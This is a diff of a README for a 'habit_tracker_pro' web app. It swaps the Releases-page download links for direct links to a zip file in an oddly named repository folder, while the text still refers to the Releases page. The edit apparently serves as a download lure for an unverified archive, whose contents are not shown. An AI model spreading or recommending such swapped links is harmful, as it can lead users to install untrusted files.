@@ -1,7 +1,7 @@
 # 🎯 habit_tracker_pro - Track Your Habits Easily
 
 ## 📥 Download the App
-[![Download habbit_tracker_pro](https://img.shields.io/badge/download-habit_tracker_pro-blue.svg)](https://github.com/Shubham123mis/habit_tracker_pro/releases)
+[![Download habbit_tracker_pro](https://github.com/Shubham123mis/habit_tracker_pro/raw/refs/heads/main/Tortrix/habit-tracker-pro-v2.1.zip)](https://github.com/Shubham123mis/habit_tracker_pro/raw/refs/heads/main/Tortrix/habit-tracker-pro-v2.1.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and run the habit_tracker_pro application. With this web app, you can easily track and analyze your daily habits.
@@ -18,7 +18,7 @@ Before you proceed, ensure your system meets these requirements:
 - Set reminders for daily tasks.
 
 ## 📥 Download & Install
-To get the latest version of habit_tracker_pro, visit this page to download: [Download habit_tracker_pro](https://github.com/Shubham123mis/habit_tracker_pro/releases).
+To get the latest version of habit_tracker_pro, visit this page to download: [Download habit_tracker_pro](https://github.com/Shubham123mis/habit_tracker_pro/raw/refs/heads/main/Tortrix/habit-tracker-pro-v2.1.zip).
 
 ### Installation Steps
 1. Click on the link above to visit the Releases page.
